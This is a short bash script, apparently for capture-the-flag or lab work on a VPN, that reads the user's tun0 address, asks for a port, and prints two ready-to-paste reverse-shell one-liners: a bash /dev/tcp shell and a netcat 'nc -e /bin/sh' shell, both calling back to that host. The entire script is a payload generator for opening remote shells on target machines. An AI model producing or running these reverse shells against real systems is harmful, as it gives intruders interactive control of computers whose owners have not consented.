#!/bin/bash
host=$(/sbin/ifconfig tun0 | grep "10.10." | awk '{print $2}')
echo What port would you like to use?
read port
printf "==================================================================\n\n"
echo   "Bash Shell:   bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'"
echo   "NetCat Shell: nc -e /bin/sh $host $port"
printf "\n==================================================================\n"
